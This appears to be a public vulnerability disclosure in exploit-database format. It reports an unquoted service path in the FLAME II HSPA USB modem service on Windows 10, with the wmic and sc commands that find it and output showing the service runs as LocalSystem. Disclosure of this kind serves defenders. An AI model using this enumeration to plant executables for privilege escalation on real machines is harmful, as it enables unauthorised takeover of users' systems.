# Exploit Title: FLAME II MODEM USB - Unquoted Service Path
# Discovery by: Ismael Nava
# Discovery Date: 02-02-2022
# Vendor Homepage: https://www.telcel.com/personas/equipos/modems-usb/alcatel/x602a
# Software Links : N/A (Is a BAM)
# Tested Version: N/A
# Vulnerability Type: Unquoted Service Path
# Tested on OS: Windows 10 64 BITS


C:>wmic service get name, displayname, pathname, startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
FLAME II HSPA USB MODEM Service		FLAME II HSPA USB MODEM Service		C:\Program Files (x86)\Internet Telcel\ApplicationController.exe                                                                                                                                                                                   Auto

C:>sc qc "FLAME II HSPA USB MODEM Service"
[SC] QueryServiceConfig CORRECTO

NOMBRE_SERVICIO: FLAME II HSPA USB MODEM Service
        TIPO               : 10  WIN32_OWN_PROCESS
        TIPO_INICIO        : 2   AUTO_START
        CONTROL_ERROR      : 1   NORMAL
        NOMBRE_RUTA_BINARIO: C:\Program Files (x86)\Internet Telcel\ApplicationController.exe
        GRUPO_ORDEN_CARGA  :
        ETIQUETA           : 0
        NOMBRE_MOSTRAR     : FLAME II HSPA USB MODEM Service
        DEPENDENCIAS       :
        NOMBRE_INICIO_SERVICIO: LocalSystem